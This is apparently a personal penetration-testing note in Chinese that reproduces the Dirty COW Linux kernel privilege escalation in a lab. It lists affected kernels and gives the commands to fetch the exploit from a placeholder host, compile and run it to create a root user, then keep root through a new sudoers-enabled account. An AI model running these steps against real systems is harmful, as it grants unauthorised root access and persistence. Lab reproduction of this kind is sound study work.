---
title: 脏牛提权复现
date: 2023-09-03T15:29:52+08:00
updated: 2023-08-11T23:14:01+08:00
categories: 
- 渗透测试
- 漏洞复现
- 提权
---

## 漏洞介绍

漏洞具体是由于get_user_page内核函数在处理Copy-on-Write的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。

## 环境搭建

注意影响的内核版本(低于)

```
Centos7/RHEL7     3.10.0-327.36.3.el7
Cetnos6/RHEL6     2.6.32-642.6.2.el6
Ubuntu 16.10      4.8.0-26.28
Ubuntu 16.04      4.4.0-45.66
Ubuntu 14.04      3.13.0-100.147
Debian 8          3.16.36-1+deb8u2
Debian 7          3.2.82-1
```

复现采用的版本

![uname](E:\笔记软件\笔记\渗透测试\漏洞复现\提权\脏牛\uname.png)

安装apache,php服务

```
yum  -y install httpd php
```

关闭防火墙，开启80端口即可启动httpd服务

## 漏洞复现

上传exp到目标靶机的tmp目录(注意要是可写可编译的目录)

```
wget http://xxxx:8000/dirty.c
```

编译exp

```
gcc -pthread dirty.c -o dirty –lcrypt
```

执行该脚本创建具有root权限的用户

```
./dirty 114514
```

查看etcpasswd能看到名为firefart的root用户

![firefart](E:\笔记软件\笔记\渗透测试\漏洞复现\提权\脏牛\firefart.png)

使用su命令切换到该用户

```
su firefart
```

![su命令](E:\笔记软件\笔记\渗透测试\漏洞复现\提权\脏牛\su命令.png)

成功提权到root权限，成功后使用脚本保存的/passwd.bak文件恢复原有的文件

```
mv /tmp/passwd.bak /etc/passwd
```

还原后不用急着退出，通过创建新的root权限用户来保存我们原有的root权限

```
adduser dirty
passwd dirty
```

更改sudoers文件，使dirty用户拥有所有权限

![dirty](E:\笔记软件\笔记\渗透测试\漏洞复现\提权\脏牛\dirty.png)

切换为dirty用户即可执行root用户的命令

**注意**

编译gcc文件最好是在目标靶机上进行编译，谨防模块的缺失和版本不同，利用该漏洞前注意确认内核版本

### 参考链接

https://github.com/FireFart/dirtycow

https://xz.aliyun.com/t/9757